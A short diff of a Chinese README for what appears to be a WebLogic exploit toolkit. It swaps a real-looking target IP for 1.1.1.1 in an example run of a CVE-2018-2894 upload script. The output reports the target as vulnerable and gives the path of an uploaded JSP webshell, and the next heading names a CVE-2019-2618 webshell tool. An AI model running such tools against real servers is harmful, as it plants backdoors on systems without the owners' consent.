@@ -235,10 +235,10 @@
 > ```
 > EXP:
 > ```
-> zhzy@debian:/debian/archives-tool/web-weblogic$ python cve-2018-2894_upload.py -t http://182.61.16.221:7004
+> zhzy@debian:/debian/archives-tool/web-weblogic$ python cve-2018-2894_upload.py -t http://1.1.1.1:7001
 > [*] First Deploying Website Please wait a moment ...
-> [+] http://182.61.16.221:7004 exists CVE-2018-2894
-> [+] Check URL: http://182.61.16.221:7004/ws_utc/css/config/keystore/1585895893159_360sglab.jsp 
+> [+] http://1.1.1.1:7001 exists CVE-2018-2894
+> [+] Check URL: http://1.1.1.1:7001/ws_utc/css/config/keystore/1585895893159_360sglab.jsp 
 > ```
 
 ## cve-2019-2618_webshell.py Weblogic 任意文件上传漏洞 (需要账户密码)
